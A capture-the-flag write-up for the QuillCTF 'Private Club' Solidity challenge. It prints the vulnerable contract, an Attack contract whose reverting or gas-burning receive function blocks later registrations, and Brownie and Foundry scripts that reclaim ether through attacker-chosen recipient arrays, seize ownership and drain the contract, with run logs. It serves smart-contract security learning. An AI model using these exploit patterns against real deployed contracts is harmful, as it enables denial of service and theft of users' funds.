---
title: Private Club - Quillctf
#image: 'https://quillctf.super.site/_next/image?url=https%3A%2F%2Fassets.super.so%2Fa799195c-7c08-410a-9254-50dd9f21a772%2Fimages%2F6e1d60ba-8a0b-4588-9413-fb30d1dfee82%2F1374FC4A-D8B8-4767-B951-ED874164BB64.png&w=1920&q=80'
created: 2023-05-03
tags:
    - 'smart contracts'
    - 'web3'
    - 'brownie'
    - 'quillctf'
---

### Description:
Ah yes, a private club with lots of money just waiting to be stolen. What could possibly go wrong? 


### Objective of CTF

Become a member of a private club.
Block future registrations.
Withdraw all Ether from the privateClub contract.


- `PrivateClub.sol`
```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

  

import "@openzeppelin/contracts/access/Ownable.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

  

contract PrivateClub is ReentrancyGuard, Ownable {

uint private registerEndDate;

event setRegEndDate(uint registerEndDate);

event memberWithdrawevent(address member, address to, uint amount);

address[] public members_;

mapping(address => bool) public members;

  

receive() external payable {}

  

uint public membersCount;

  

function setRegisterEndDate(uint _newRegisterEndDate) external onlyOwner {

	registerEndDate = _newRegisterEndDate;
	
	emit setRegEndDate(registerEndDate);

}

  

function becomeMember(

address[] calldata _members

) external payable nonReentrant {
	
	require(block.timestamp < registerEndDate, "registration closed");
	
	require(_members.length == membersCount, "wrong members length");
	
	require(msg.value == membersCount * 1 ether, "need more ethers");
	
	for (uint i = 0; i < _members.length; i++) {
	
		_members[i].call{value: 1 ether}("");

	}

	membersCount += 1;
	
	members[msg.sender] = true;
	
	members_.push(msg.sender);

}

  

modifier onlyMember() {

	bool member;
	
	for (uint i = 0; i < membersCount; i++) {
	
	if (members_[i] == msg.sender) {
	
	member = true;
	
	}

}

  

	require(member == true, "you are not a member");
	_;

}

  

function adminWithdraw(address to, uint amount) external onlyOwner {

	payable(to).call{value: amount}("");

}

  

function addMemberByAdmin(address newMember) external onlyOwner {

	membersCount += 1;
	
	members[newMember] = true;
	
	members_.push(newMember);

}

  

function buyAdminRole(address newAdmin) external payable onlyMember {

	require(msg.value == 10 ether, "need 10 ethers");
	
	_transferOwnership(newAdmin);
	
	}

}
```

- So we have this contract & we have 3 tasks

	1. Become a member of a private club.
	2. Block future registrations.
	3. Withdraw all Ether from the privateClub contract.

 1. The first one is pretty easy we just have to call the `becomeMember()` function with proper `_members` array to pass these requie statements. 
- ![](assets/pc1.png)
- The first one should pass because as per the `foundry` setup file given we have 5 days to register
- ![](assets/pc2.png)
- Next the `length` of the `_members` array should be equal to `number of members` in the contract.
- Lastly we have to send ether `equal` to no. of members. If there are `3` members we have to send `3` ETH & so on.

- If we pass all these checks then we will be a memeber.

2. 2nd one is bit confusing because it says 'To block future registrations'. In laymans terms we just have to make the next user consume more gas than the `blocGasLimit` set in the setup file.
![](assets/pc3.png)
1. 3rd we have to send 10 ETH to become owner & call `adminWithdraw()` to drain the contract. But initially we only have 10 ETH & all these transactions will cost ETH + we are sending ETH to the contract & we can't add more ETH. 


# Solution: Using brownie(python framework) - Method 1
- `helpful_scripts.py`
```py
#!/usr/bin/python3
from brownie import network, accounts, config

FORKED_LOCAL_ENVIRONMENTS = ["mainnet-fork", "mainnet-fork-dev"]
LOCAL_BLOCKCHAIN_ENVIRONMENTS = [
    "development",
    "ganache-local",
    "ganache-local-new-chainId",
]


def get_account():
    if (
        network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS
        or network.show_active() in FORKED_LOCAL_ENVIRONMENTS
    ):
        return (
            accounts[0],
            accounts[1],
            accounts[2],
            accounts[3],
            accounts[4],
            accounts[5],
        )

    if network.show_active() in config["networks"]:
        return accounts.add(config["wallets"]["from_key"])

    return None
```
- `deploy.py`
```py
#!/usr/bin/python3
from brownie import PrivateClub, web3
from scripts.helpful_scripts import get_account
import datetime


def convert(amount):
    return web3.fromWei(amount, "ether")


def deploy():
    owner, ownerFriend, user2, user3, user4, attacker = get_account() 

    # inital eth is 1000. so transfer 990 eth to the owner so that everyone has only 10 ETH each
    user2.transfer(owner, "990 ether")
    user3.transfer(owner, "990 ether")
    user4.transfer(owner, "990 ether")
    attacker.transfer(owner, "990 ether")

    pc = PrivateClub.deploy({"from": owner})

    print(f"Contract Deployed to {pc.address}")

    deadline = web3.eth.getBlock("latest")["timestamp"] + int(
        datetime.timedelta(days=5).total_seconds()
    )

    # register end date
    pc.setRegisterEndDate(deadline, {"from": owner}).wait(1)

    # make friend an admin
    pc.addMemberByAdmin(ownerFriend.address, {"from": owner}).wait(1)

    # send some ETH in the contract
    ownerFriend.transfer(pc.address, "100 ether").wait(1)

    # user1 becoming member
    _members = [ownerFriend.address]
    pc.becomeMember(_members, {"from": user2, "value": "1 ether"}).wait(1)


    # user2 becoming member
    _members = [ownerFriend.address, user3.address]
    pc.becomeMember(_members, {"from": user3, "value": "2 ether"}).wait(1)


    return pc, ownerFriend, user2, user3, user4, attacker


def main():
    deploy()

```
- These are helper scripts which is setting up the enviroment. Same as the given `foundry` setup file. Details are mentioned in the comments.
- Moving on to the main test script.

- `test_all.py`
```py
#!/usr/bin/python3
from brownie import PrivateClub, web3, Attack
from colorama import Fore
from scripts.deploy import deploy

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


blockGasLimit = 120000

def test_all():
    private_club, ownerFriend, user2, user3, user4, attacker = deploy()
    _members = [attacker.address] * private_club.membersCount()
    old_owner = private_club.owner()

    tx = private_club.becomeMember(_members, {"from": attacker, "value": "3 ether"})
    tx.wait(1)

    # task1: become member of the club and
    # print(private_club.members(attacker, {"from": attacker}))
    assert private_club.members(attacker, {"from": attacker}) == True

    attacking_contract = Attack.deploy(private_club.address, {"from": attacker})
    _members = [attacker.address] * private_club.membersCount()
    amount = private_club.membersCount()

    attacking_contract.attack(
        _members, f"{amount} ether", {"from": attacker, "value": f"{amount} ether"}
    )

    _members.append(attacking_contract.address)
    amount = private_club.membersCount()

    private_club.becomeMember(
        _members, {"from": user4, "value": f"{amount} ether"}
    ).wait(1)


    print(f"{green}Gas used by user4: {blue}{web3.eth.getBlock('latest').gasUsed}")
    print(f"{green}Gas limit is:      {blue}{blockGasLimit}{reset}")

    assert web3.eth.getBlock("latest").gasUsed > blockGasLimit

    # withdraw the money from our contract
    attacking_contract.payback({"from": attacker}).wait(1)

    private_club.buyAdminRole(
        attacker.address, {"from": attacker, "value": f"10 ether"}
    )

    private_club.adminWithdraw(
        attacker.address, private_club.balance(), {"from": attacker}
    )

    print(f"{blue}Old owner: {green}{old_owner}")
    print(f"{blue}New owner: {red}{private_club.owner()}{reset}")
    print(f"{blue}Attacker : {red}{attacker.address}")
    print(
        f"{blue}Attacker balance: {red}{web3.fromWei(attacker.balance(), 'ether')} ETH"
    )

    assert private_club.owner() == attacker.address
    assert attacker.balance() > 110000000000000000000 - 1
```

- Let's go through task by task
1. We have to be a memeber.
	- `private_club, ownerFriend, user2, user3, user4, attacker = deploy()`. here we are using the helper scripts to setup the contracts & accounts.
	- `_members = [attacker.address] * private_club.membersCount()`. This is setting up the memebers array. `Why it's like this?` Definitely explain in a bit.
	- Then we are calling the `becomeMember()` member & this is the brownie syntax for this 
	- ![](assets/pc4.png)
	- Waiting for the tx to pass in line `64` & lastly we are checking if we became the memeber or not using assertion
2. Next we have to make the script such that the next user's transcation consumes more gas than the given `blockGasLimit`. But this tx consumes way more less gas than this. How can we do that then ?
	- There are 2 ways. 
		1. By deploying a contract with a `fallback` function.
		2. By calling the `becomeMember()` function multiple time.
	- But why ?
	- If we look closely at the contract at line `30`. The contract is using the low `level` function call `call` method on the memebers with `1 ETH`. 
	- ![](assets/pc5.png)
	- We can abuse this part by doing a [denial of service(DOS)](https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/) attack. It's simple we can make a malicious contract with a `fallback` function which will `revert`(it worked in brownie but for foundry had to add a couple of more operations to make it consume more gas). 
	- Here is the attack contract looks like
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PrivateClub.sol";

contract Attack {
    PrivateClub private club;
    address public owner;
    event Received(address, uint);

    constructor(address payable _addr) {
        club = PrivateClub(_addr);
        owner = msg.sender;
    }

    function attack(
        address[] calldata _members,
        uint256 _amount
    ) external payable {
        require(msg.value == _amount, "Send more ETH");
        club.becomeMember{value: _amount}(_members);
    }

    // consume gassssss
    receive() external payable {
        revert();
    }

    function payback() external payable {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```
denial of service(DOS)
 - The `constructor` is pretty basic & we have a `attack` function & a `fallback` funciton. The `payback` fn is there to withdraw if anyting is left.
 - So the `attack function` will call the target contract to become a member. Let's look at the python code for assertion.
- ![](assets/pc6.png)
- First we are deploying the contract then calling the `Attack` contract & then we are calling the `attack()` fn. with `_memebers` array & `amount`. There is a specific reason for making the `_memebers` list like this. Wait for the right moment ;). 
- ![](assets/pc7.png)
- Next we are trying to register as `user4` which will consume more gas than usual.
### Explanation
- Remeber this line
![](assets/pc8.png)
- Whenever `becomeMember()` is called this line will execute & this will make a `.call` to all other memebers with `1 ETH` including our malicous which has a fallback function which will `revert()` the call & consume the gas. That's why when `user4` calls the `becomeMember()` fn. & it will cost more gas and aslo as the `_members.length` of the `unbounded array` increases the gas consumption increases. Here is the debug output
- ![](assets/pc9.png)
1. Now the `3rd` & final task. We just have to send `10` ETH to become the owner right ? Nope! you're wrong. It's not that simple. Because after all these operation there is no way we will still have 10 ETH left. Even if we haven't sent any ETH(which is not) the gas fees will make our balance less than 10. Then how can we do this ?? 
	- Remember this line ?
	- ![](assets/pc10.png)
	- So the `_members` array looks like this where `0x807c47A89F720fe4Ee9b8343c286Fc886f43191b` is our address. 
```py
['0x807c47A89F720fe4Ee9b8343c286Fc886f43191b', '0x807c47A89F720fe4Ee9b8343c286Fc886f43191b', '0x807c47A89F720fe4Ee9b8343c286Fc886f43191b']
```
 - But this should not work because we can't modify the storage in this contract right ?
### Explanation
Here comes the 2nd vulnerability. If we look at the `becomeMember()` function argument we can see that the `_members` array is `calldata` not `storage` !!. Wait what ??? Yup. It's reading whatever data is passed as parameter. That's how we can control the `_members` array. That's the reason why I'm setting the list like this `_members = [attacker.address] * private_club.membersCount()`. So every time `_members[i].call{value: 1 ether}("");` this line is executed we will get `1 ETH` back which will make our balance at the end roughly `15 ETH`. So easy-peasy. Now we can just send 10 ETH & drain the contract. That's the rest of the code is doing.
![](assets/pc11.png)

## POC
```bash
brownie run scripts/attack.py 
Brownie v1.19.3 - Python development framework for Ethereum

PrivateClubProject is the active project.

Launching 'ganache-cli --chain.vmErrorsOnRPCResponse true --wallet.totalAccounts 10 --hardfork istanbul --miner.blockGasLimit 12000000 --wallet.mnemonic brownie --server.port 8545'...

Running 'scripts/attack.py::main'...
1000
Transaction sent: 0xd36b6f1bc534db677c7f27d2d90080a985894fdc2511b99243b83b91b5d2763a
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 1   Gas used: 21000 (0.18%)

Transaction sent: 0x9c99cad509da08b51a53e3edd1f29a6a7d928202b2d97b9104304eb09b7eff85
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 2   Gas used: 21000 (0.18%)

Transaction sent: 0x091ada45f3b310c315d2da0df432538ac21641ec0cc71e0ed1a00a9382c6b03a
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 3   Gas used: 21000 (0.18%)

Transaction sent: 0xb64634874695ca7430c5ce50d5a0f7fb9f82f6693b0e8c3f5189394daf87af93
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 4   Gas used: 21000 (0.18%)

Transaction sent: 0x7c4243dd279855b5e0342ce973b5666bd583eb335fcf2b2e6addab16db7c28a2
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  PrivateClub.constructor confirmed   Block: 5   Gas used: 633968 (5.28%)
  PrivateClub deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87

Contract Deployed to 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87
Transaction sent: 0xeddbb3f34f7281d3f4e046eff4b153cc641f9cffb89dbb9920564be0d5d82801
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.setRegisterEndDate confirmed   Block: 6   Gas used: 43382 (0.36%)

  PrivateClub.setRegisterEndDate confirmed   Block: 6   Gas used: 43382 (0.36%)

Transaction sent: 0x4f6d242d392acaa7782c4916f9f84e0970731e097ab3cf77dc4ddbdf84ff1613
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  PrivateClub.addMemberByAdmin confirmed   Block: 7   Gas used: 106106 (0.88%)

  PrivateClub.addMemberByAdmin confirmed   Block: 7   Gas used: 106106 (0.88%)

Transaction sent: 0x0eb644dee6a379dc6d5a221df30ffb2628c95a205b8675e195ab039d464a3753
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 8   Gas used: 21055 (0.18%)

  Transaction confirmed   Block: 8   Gas used: 21055 (0.18%)

Transaction sent: 0xafe7dab9e9c99607f4ef19ee1670a619baa95eafec1d2c7efb92a48654901c66
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 9   Gas used: 88535 (0.74%)

  PrivateClub.becomeMember confirmed   Block: 9   Gas used: 88535 (0.74%)

Transaction sent: 0x174c497c67ab92491c41c5e354458b47a293198f13d4db60904c550152263ac5
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 10   Gas used: 96744 (0.81%)

  PrivateClub.becomeMember confirmed   Block: 10   Gas used: 96744 (0.81%)

['0x807c47A89F720fe4Ee9b8343c286Fc886f43191b', '0x807c47A89F720fe4Ee9b8343c286Fc886f43191b', '0x807c47A89F720fe4Ee9b8343c286Fc886f43191b']
Transaction sent: 0x0ac8559bcdea8b22f897f14c00a41060eafc7ee178c1b70a4103f5fdcffa7035
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 11   Gas used: 104953 (0.87%)

  PrivateClub.becomeMember confirmed   Block: 11   Gas used: 104953 (0.87%)

Transaction sent: 0xefe286e256713b0b39ca6589213dc917f96f8bfc914cb9bd091a5e54116fe35f
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  Attack.constructor confirmed   Block: 12   Gas used: 291480 (2.43%)
  Attack deployed at: 0xd331D8A296f59F89d743e1c6E8b660ECcdBD0030

Transaction sent: 0x92b210306643cbbb31eb5a9ab64e80b8775d74e1b890a1422cdf67098b8349e5
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 3
  Attack.attack confirmed   Block: 13   Gas used: 123492 (1.03%)

Transaction sent: 0x67602ac93625a32be7e0be7dca8e246a997a265a6383253c417fd4beb7e38422
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 14   Gas used: 165059 (1.38%)

  PrivateClub.becomeMember confirmed   Block: 14   Gas used: 165059 (1.38%)

Gas used by user4: 165059
Gas limit is:      120000
Transaction sent: 0xff19e1ba766967a8f7b5a9fd0b6a69348ab476bb4af520a8286f873b20e73e35
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 4
  Attack.payback confirmed   Block: 15   Gas used: 23639 (0.20%)

  Attack.payback confirmed   Block: 15   Gas used: 23639 (0.20%)

Transaction sent: 0xa0f1b9415ddb582087f74dff921454d7244c2e11cf71c235f8463a17a1c682a2
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 5
  PrivateClub.buyAdminRole confirmed   Block: 16   Gas used: 46015 (0.38%)

Transaction sent: 0xfd01000578438745a4153d2fbe3a41c2764789d9bd90736022b49c86c88b0008
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 6
  PrivateClub.adminWithdraw confirmed   Block: 17   Gas used: 30432 (0.25%)

Old owner: 0x66aB6D9362d4F35596279692F0251Db635165871
New owner: 0x807c47A89F720fe4Ee9b8343c286Fc886f43191b
Attacker : 0x807c47A89F720fe4Ee9b8343c286Fc886f43191b
Attacker balance: 115 ETH
```
![](assets/pc12.png)

# Solution: Using brownie(python framework) - Method 2

- Everything is same but this time we are not using any external contracts. We just using an `EOA`. 
- `attack2.py`
```py
#!/usr/bin/python3
from brownie import PrivateClub, web3, Attack
from colorama import Fore
from scripts.deploy import deploy


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

blockGasLimit = 120000


def test_be_member_contract():
    private_club, ownerFriend, user2, user3, user4, attacker = deploy()
    _members = [attacker.address] * private_club.membersCount()
    old_owner = private_club.owner()
    amount = private_club.membersCount()

    tx = private_club.becomeMember(_members, {"from": attacker, "value": f"{amount} ether"})
    tx.wait(1)

    # task1: become member of the club and
    # print(private_club.members(attacker, {"from": attacker}))
    assert private_club.members(attacker, {"from": attacker}) == True

    _members = [attacker.address] * private_club.membersCount()
    amount = private_club.membersCount()
    tx = private_club.becomeMember(_members, {"from": attacker, "value": f"{amount} ether"})
    tx.wait(1)

    
    _members.append(attacker.address)
    amount = private_club.membersCount()

    private_club.becomeMember(
        _members, {"from": user4, "value": f"{amount} ether"}
    ).wait(1)

    
    print(f"{green}Gas used by user4: {blue}{web3.eth.getBlock('latest').gasUsed}")
    print(f"{green}Gas limit is:      {blue}{blockGasLimit}{reset}")

    assert web3.eth.getBlock("latest").gasUsed > blockGasLimit

    # withdraw the money from our contract
    # print(web3.fromWei(attacker.balance(), "ether"))

    private_club.buyAdminRole(
        attacker.address, {"from": attacker, "value": f"10 ether"}
    )

    private_club.adminWithdraw(
        attacker.address, private_club.balance(), {"from": attacker}
    )
    #print(private_club.balance())

    print(f"{blue}Old owner: {green}{old_owner}")
    print(f"{blue}New owner: {red}{private_club.owner()}{reset}")
    print(f"{blue}Attacker : {red}{attacker.address}")
    print(
        f"{blue}Attacker balance: {red}{web3.fromWei(attacker.balance(), 'ether')} ETH"
    )
    #print(attacker.balance())

    assert private_club.owner() == attacker.address
    assert attacker.balance() > 110000000000000000000 - 1


def main():
    test_be_member_contract()

```

- We just have to call the `becomeMember()` twice to increase the length of the `unbounded array _members`. That's it & the rest is same.
## POC
```bash
brownie run scripts/attack2.py
Brownie v1.19.3 - Python development framework for Ethereum

PrivateClubProject is the active project.

Launching 'ganache-cli --chain.vmErrorsOnRPCResponse true --wallet.totalAccounts 10 --hardfork istanbul --miner.blockGasLimit 12000000 --wallet.mnemonic brownie --server.port 8545'...

Running 'scripts/attack2.py::main'...
1000
Transaction sent: 0xd36b6f1bc534db677c7f27d2d90080a985894fdc2511b99243b83b91b5d2763a
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 1   Gas used: 21000 (0.18%)

Transaction sent: 0x9c99cad509da08b51a53e3edd1f29a6a7d928202b2d97b9104304eb09b7eff85
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 2   Gas used: 21000 (0.18%)

Transaction sent: 0x091ada45f3b310c315d2da0df432538ac21641ec0cc71e0ed1a00a9382c6b03a
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 3   Gas used: 21000 (0.18%)

Transaction sent: 0xb64634874695ca7430c5ce50d5a0f7fb9f82f6693b0e8c3f5189394daf87af93
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 4   Gas used: 21000 (0.18%)

Transaction sent: 0x7c4243dd279855b5e0342ce973b5666bd583eb335fcf2b2e6addab16db7c28a2
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  PrivateClub.constructor confirmed   Block: 5   Gas used: 633968 (5.28%)
  PrivateClub deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87

Contract Deployed to 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87
Transaction sent: 0xba8bbab36155c37342ad703205327e6d86fd26a7e567e9578f1e3ab71eb17b3e
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.setRegisterEndDate confirmed   Block: 6   Gas used: 43382 (0.36%)

  PrivateClub.setRegisterEndDate confirmed   Block: 6   Gas used: 43382 (0.36%)

Transaction sent: 0x4f6d242d392acaa7782c4916f9f84e0970731e097ab3cf77dc4ddbdf84ff1613
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  PrivateClub.addMemberByAdmin confirmed   Block: 7   Gas used: 106106 (0.88%)

  PrivateClub.addMemberByAdmin confirmed   Block: 7   Gas used: 106106 (0.88%)

Transaction sent: 0x0eb644dee6a379dc6d5a221df30ffb2628c95a205b8675e195ab039d464a3753
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed   Block: 8   Gas used: 21055 (0.18%)

  Transaction confirmed   Block: 8   Gas used: 21055 (0.18%)

Transaction sent: 0xafe7dab9e9c99607f4ef19ee1670a619baa95eafec1d2c7efb92a48654901c66
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 9   Gas used: 88535 (0.74%)

  PrivateClub.becomeMember confirmed   Block: 9   Gas used: 88535 (0.74%)

Transaction sent: 0x174c497c67ab92491c41c5e354458b47a293198f13d4db60904c550152263ac5
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 10   Gas used: 96744 (0.81%)

  PrivateClub.becomeMember confirmed   Block: 10   Gas used: 96744 (0.81%)

Transaction sent: 0x0ac8559bcdea8b22f897f14c00a41060eafc7ee178c1b70a4103f5fdcffa7035
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 11   Gas used: 104953 (0.87%)

  PrivateClub.becomeMember confirmed   Block: 11   Gas used: 104953 (0.87%)

Transaction sent: 0xce3ff755f0cd223b8db511aaf8aeb87622d58f93ab93ce0c375c8141e286d106
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 2
  PrivateClub.becomeMember confirmed   Block: 12   Gas used: 93962 (0.78%)

  PrivateClub.becomeMember confirmed   Block: 12   Gas used: 93962 (0.78%)

Transaction sent: 0xcce9a0fb58ba7ce9ba63fc0f045744c351b4611d7c8ada5f407f98ffedc54801
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  PrivateClub.becomeMember confirmed   Block: 13   Gas used: 121371 (1.01%)

  PrivateClub.becomeMember confirmed   Block: 13   Gas used: 121371 (1.01%)

Gas used by user4: 121371
Gas limit is:      120000
Transaction sent: 0xc7c0a5a16fd3824823cdf35e1e079189a8b42f4aded7d5b120bea5d04af579a6
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 3
  PrivateClub.buyAdminRole confirmed   Block: 14   Gas used: 46023 (0.38%)

Transaction sent: 0xbaf45168e288d05b75e9a574aaff1acbd4973df7092fb9683d3953d3ab5eb163
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 4
  PrivateClub.adminWithdraw confirmed   Block: 15   Gas used: 30432 (0.25%)

Old owner: 0x66aB6D9362d4F35596279692F0251Db635165871
New owner: 0x807c47A89F720fe4Ee9b8343c286Fc886f43191b
Attacker : 0x807c47A89F720fe4Ee9b8343c286Fc886f43191b
Attacker balance: 115 ETH
```
![](assets/pc13.png)

# Solution: Using foundry(rust framework) - Method 1

- Logic is same but the `Attack` contract is a bit different instead of `revert()` I used a `event` & `loop` to consume gas rest is same
  
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PrivateClub.sol";

contract Attack {
    PrivateClub private club;
    address public owner;
    event Received(address, uint);

    constructor(address payable _addr) {
        club = PrivateClub(_addr);
        owner = msg.sender;
    }

    function attack(
        address[] calldata _members,
        uint256 _amount
    ) external payable {
        require(msg.value == _amount, "Send more ETH");
        club.becomeMember{value: _amount}(_members);
    }

    // consume gassssss
    receive() external payable {
        // https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/
        emit Received(msg.sender, msg.value);
        for (uint8 i = 0; i < 5; i++) {
            payable(owner).call{value: msg.value, gas: 20000}("");
        }
        // revert();
    }

    function payback() external payable {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```

- `Hack.t.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";
import "../src/Attack.sol";
import "forge-std/console.sol";

contract Hack is Test {
    PrivateClub club;
    Attack private attacking_contract;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint256 blockGasLimit = 120000; // 121449

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);

        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();

        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();

        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:

        address[] memory mForattacker = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker[i] = hacker;
        }
        uint256 etherAmount = mForattacker.length * 1 ether;

        club.becomeMember{value: etherAmount}(mForattacker);
        console.log(hacker.balance);

        // check - hacker is member
        assertTrue(club.members(hacker));

        attacking_contract = new Attack(payable(address(club)));
        // console.log(address(attacking_contract));
        // console.log(attacking_contract.owner());
        // console.log(hacker);
        // for (uint i = 0; i < club.membersCount(); i++) {
        //     console.log(club.members_(i));
        // }

        address[] memory mForAttackingContract = new address[](
            club.membersCount()
        );
        for (uint i = 0; i < club.membersCount(); i++) {
            mForAttackingContract[i] = hacker;
        }
        etherAmount = mForAttackingContract.length * 1 ether;
        // console.log(etherAmount);
        attacking_contract.attack{value: etherAmount}(
            mForAttackingContract,
            etherAmount
        );
        // console.log(club.members(address(attacking_contract)));
        console.log(hacker.balance);
        // console.log(address(attacking_contract).balance);

        // for (uint i = 0; i < club.membersCount(); i++) {
        //     console.log(club.members_(i));
        // }

        // console.log(address(attacking_contract));
        vm.stopPrank();

        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);

        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }

        etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        // console.log(gasleftbeforeTxStart);
        // console.log(gasleftAfterTxStart);
        // console.log(gasleftbeforeTxStart - gasleftAfterTxStart);
        // console.log(blockGasLimit);
        console.log(hacker.balance);
        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();

        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
        attacking_contract.payback();
        console.log(hacker.balance);
        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, address(club).balance);

        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}

```

- I'm not a fondry expert so my code is pretty rookie & contains a hell lot of debug statements. 

## POC
```bash
forge test --match-path test/Hack.t.sol -vvvv                                                           ⟨12:52:12⟩ ⎭
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/Hack.t.sol:Hack
[PASS] test_attack() (gas: 694585)
Logs:
  10000000000000000000
  10000000000000000000
  12000000000000000000
  12000000000000000000

Traces:
  [694585] Hack::test_attack() 
    ├─ [0] VM::startPrank(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   └─ ← ()
    ├─ [2395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [79626] PrivateClub::becomeMember{value: 3000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] console::f5b1bba9(0000000000000000000000000000000000000000000000008ac7230489e80000) [staticcall]
    │   └─ ← ()
